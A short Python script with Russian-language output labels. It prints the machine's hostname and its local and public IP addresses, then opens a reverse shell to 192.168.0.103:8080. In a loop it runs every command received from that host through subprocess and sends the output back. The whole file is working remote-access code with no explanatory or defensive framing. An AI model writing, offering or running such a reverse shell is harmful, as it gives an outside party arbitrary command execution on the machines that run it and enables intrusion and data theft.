import socket
from requests import get
import subprocess

hostname = socket.gethostname()

local_ip = socket.gethostbyname(hostname)

public_ip = get('http://api.ipify.org').text

print(f'Хост: {hostname}')
print(f'Локальный IP: {local_ip}')
print(f'Публичный IP: {public_ip}')

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.0.103', 8080))

while 1:
    command = s.recv(1024).decode()
    if command.lower() == 'exit':
        break
    output = subprocess.getoutput(command)
    s.send(output.encode())
s.close()
